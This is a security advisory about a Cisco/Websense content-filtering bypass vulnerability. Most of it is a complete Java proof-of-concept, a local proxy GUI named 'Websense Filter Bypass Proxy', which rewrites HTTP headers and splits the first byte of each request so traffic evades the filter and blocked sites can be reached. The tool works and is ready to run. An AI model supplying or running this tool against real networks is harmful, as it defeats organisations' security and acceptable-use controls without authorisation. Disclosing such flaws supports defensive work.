source: http://www.securityfocus.com/bid/17883/info

Multiple Cisco products are susceptible to a content-filtering bypass vulnerability. This issue is due to a failure of the software to properly recognize HTTP request traffic.

This issue allows users to bypass content-filtering and access forbidden websites.

Cisco is tracking this issue as Bug IDs CSCsc67612, CSCsc68472, and CSCsd81734.http://www.cisco.com/pcgi-bin/Support/Bugtool/onebug.pl?bugid=CSCsd81734

// Copyright (C) 2005-2006 Virtual Security Research, LLC. - All rights reserved

// Disclaimer: Use this tool at your own risk. The author of this utility 
// nor Virtual Security Research, LLC. will assume any liability for damage 
// caused by running this code. This utility is provided for educational 
// purposes only.

import java.lang.*;
import java.net.*;
import java.io.*;
import java.util.*;
import javax.swing.JFrame;
import javax.swing.JScrollPane;
import javax.swing.JTextArea;
import javax.swing.SwingUtilities;
import java.awt.BorderLayout;

class WebsenseBypassProxyConnection implements Runnable {
    Socket csock;
    Socket ssock;
    static int count = 0;
    WebsenseBypassProxy wbp;
    public WebsenseBypassProxyConnection(Socket csock, WebsenseBypassProxy parent) {
	this.csock = csock;
	this.wbp = parent;
    }
    private StringBuffer GetHeader(InputStream istream) throws IOException {
	ByteArrayOutputStream out = new ByteArrayOutputStream();
	int i;
	do {
	    i = istream.read();
	    if (i == -1) {
		if(out.size() > 0) {
		    String s = out.toString();
		    if(s.endsWith("\r\n"))
			return (new StringBuffer(out.toString() + "\r\n"));
		    else if (s.endsWith("\n"))
			return (new StringBuffer(out.toString() + "\n"));
		}
		throw (new IOException());
	    }
	    out.write((byte) i);
	} while ((!out.toString().endsWith("\r\n\r\n")) &&
		 (!out.toString().endsWith("\n\n")));
	return (new StringBuffer(out.toString()));
    }
    private HashMap GetHeaderParam(StringBuffer header) {
	HashMap h = new HashMap();
	int i=0;
	try {
	    if ((i=header.toString().indexOf("\n")) > 0) {
		StringTokenizer stok =
		    new StringTokenizer(header.toString().substring(i),
					":\r\n", true);
		try {
		    while(stok.hasMoreTokens()) {
			// Get name value pair
			String tok = stok.nextToken(":").trim().toLowerCase();
			stok.nextToken();
			String tokval = stok.nextToken("\r\n").trim();
			h.put(tok, tokval);
			//System.out.println("n, v: "+tok +", "+tokval);
		    }
		} catch(NoSuchElementException e) {
		}
	    }
	} catch (Exception e) {
	}
	return(h);
    }
    private StringBuffer GetReqBody(InputStream istream) throws IOException {
	ByteArrayOutputStream out = new ByteArrayOutputStream();
	int i;
	while (!(out.toString().endsWith("\r\n\r\n") ||
		 out.toString().endsWith("\n\n"))) {
	    
	    i = istream.read();
	    if (i== -1) {
		if(out.size() > 0) {
		    String s = out.toString();
		    if(s.endsWith("\r\n"))
			return (new StringBuffer(out.toString() + "\r\n"));
		    else if (s.endsWith("\n"))
			return (new StringBuffer(out.toString() + "\n"));
		}
		throw (new IOException());
	    }
	    out.write((byte) i);
	}
	return (new StringBuffer(out.toString()));
    }
    public void run() {
	Socket ssock = null;
	InputStream clientIn = null;
	BufferedOutputStream clientOut = null;
	InputStream serverIn = null;
	BufferedOutputStream serverOut = null;
	int i=0;
	int ch=-1,r0=-1,r1=-1;
	try {
	    clientIn = csock.getInputStream();
	    clientOut = new BufferedOutputStream(csock.getOutputStream());
	    StringBuffer buf = GetHeader(clientIn);
	    int idx = buf.indexOf("Proxy-Connection:");
	    int eol = buf.indexOf("\r\n", idx+18);
	    //System.out.println("Idx: "+idx+" ,eol: "+eol);
	    if ((idx > 0) && (eol > 0)) {
		buf = buf.replace(idx, eol, "Connection: close");
	    }
	    // And we should just make our lives easy and change keep-alives
	    // to close.
	    idx = -1;
	    eol = -1;
	    
	    idx = buf.indexOf("Keep-Alive:");
	    eol = buf.indexOf("\r\n",idx+11);
	    
	    //System.out.println("Idx: "+idx+" ,eol: "+eol);
	    if ((idx > 0) && (eol > 0)) {
		buf = buf.replace(idx, eol, "Keep-Alive: close");
	    }

	    HashMap h = GetHeaderParam(buf);
	    StringTokenizer st = new StringTokenizer(buf.toString());
	    String reqtype = st.nextToken().toUpperCase();
	    URL req = new URL(st.nextToken());
	    String remotehost = req.getHost();
	    int remoteport = req.getPort();
	    if (remoteport == -1) {
		remoteport = 80;
	    }
	    
	    // change the target to remove the host and protocol
	    idx = -1;
	    int end = -1;
	
	    idx = buf.indexOf(reqtype + " "+ req.toString());
	    end = idx + (reqtype+" "+req.toString()).length();
	
	    //System.out.println("Request and URL Idx: "+idx+" , end: "+end);
	    if ((idx >= 0) && (end > 0)) {
		buf = buf.replace(idx, end, reqtype+" "+
				  req.getPath().toString());
	    }
	    wbp.displayMessage(">> "+reqtype+" "+req.getPath().toString()+"\n");
	    //System.out.println(">> "+reqtype+" "+req.getPath().toString());
	    ssock = new Socket(remotehost,remoteport);
	    //StringBuffer buf2 = GetReqBody(clientIn);
	
	    StringReader sr = new StringReader(buf.toString());

	    serverIn = ssock.getInputStream();
	    serverOut = new BufferedOutputStream(ssock.getOutputStream());
	    while ((ch = sr.read()) != -1) {
		serverOut.write(ch);
		if (i == 0) {
		    // Flush out the first byte
		    serverOut.flush();
		}
		i++;
	    }
	    serverOut.flush();
	    while ((ch = serverIn.read()) != -1) {
		clientOut.write(ch);
	    }
	    wbp.displayMessage(">>XX>> Server stream closed\n");
	    //System.out.println(">>XX>> Server stream closed");
	    clientOut.flush();
	    // just added
	    csock.shutdownOutput();
	    ssock.close();
	    csock.close();
	    ssock.close();
	    csock.close();
	} catch (Exception e) {
	    e.printStackTrace(System.err);
	}
    }
}

public class WebsenseBypassProxy extends JFrame {
    private Object lock = new Object();
    private JTextArea displayArea;

    public WebsenseBypassProxy() {
	super("Websense Filter Bypass Proxy 1.0");
	displayArea = new JTextArea();
	add(new JScrollPane(displayArea), BorderLayout.CENTER);
	setSize(400, 250);
	setVisible(true);
	displayArea.setEditable(false);
    }

    void start (int lport) {
	WebsenseBypassProxyListener wbp=new WebsenseBypassProxyListener(this);
	wbp.lport = lport;
	Thread listener = new Thread(wbp);
	listener.start();
	displayMessage("Starting proxy listener on port: "+lport+"\n");
	//System.out.println("Starting proxy listener on port: "+lport);
    }
    void shutdown() {
    	synchronized(lock) {
	}
    }
    public void displayMessage( final String messageToDisplay ) {
      SwingUtilities.invokeLater(
         new Runnable() {
            public void run()  {
               displayArea.append( messageToDisplay );
            } 
         }  
      ); 
    }
    public void run(int lport) {
	ServerSocket lsock;
	try {
	    lsock = new ServerSocket(lport);
	    for (;;) {
		try {
		    Socket s;
		    s = lsock.accept();
		    WebsenseBypassProxyConnection wbpc =
			new WebsenseBypassProxyConnection(s, this);
		    Thread t = new Thread(wbpc);
		    t.start();
		} catch (IOException e) {
		    System.out.print(e.toString());
		    return;
		}
	    }
	} catch (Exception e) {
	    System.out.print(e.toString());
	}
	
    }
    public static void main(String[] argv) {
	if (argv.length != 1) {
	    System.err.println(
			   "Usage:\n\t java WebsenseBypassProxy <portnum>\n");
	} else {
	    try {
		int localport = Integer.parseInt(argv[0]);
		WebsenseBypassProxy wbp = new WebsenseBypassProxy();
		wbp.start(localport);
	    } catch (Exception e) {
		e.printStackTrace(System.err);
	    }
	}
    }
}

class WebsenseBypassProxyListener implements Runnable {
    WebsenseBypassProxy p;
    public int lport;
    public WebsenseBypassProxyListener(WebsenseBypassProxy p) {
	this.p = p;
    }
    public void run() {
	p.run(lport);
    }
}